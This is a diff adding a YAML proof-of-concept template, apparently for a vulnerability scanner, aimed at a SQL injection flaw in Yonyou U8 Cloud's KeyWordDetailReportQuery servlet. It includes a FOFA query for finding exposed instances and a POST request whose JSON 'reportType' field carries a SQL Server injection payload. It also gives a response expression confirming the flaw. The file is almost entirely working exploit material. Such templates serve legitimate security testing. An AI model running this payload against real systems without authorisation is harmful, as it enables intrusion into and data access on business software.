@@ -1,0 +1,29 @@
+id: poc-yaml-yongyou-nc-keyworddetailreportquery-sqli
+info:
+  name: 用友U8 cloud KeyWordDetailReportQuerysql注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8cloud
+  fofa: app="用友-U8-Cloud"
+variables:
+  random: random_int(10000,99999)
+  result: md5(random)
+requests:
+- method: POST
+  path: /servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery
+  headers:
+    Content-Type: application/json
+  data: '{ "reportType": "'' AND 2780 IN (select sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''{{.random}}'')))
+    AND ''njGF''=''njGF", "usercode": "18701014496", "keyword": [ { "keywordPk": "1",
+    "keywordValue": "1", "keywordIndex": 1 } ] }
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,"nvarchar") &&
+
+    contains(body,result)
+
+    '
+transport: http
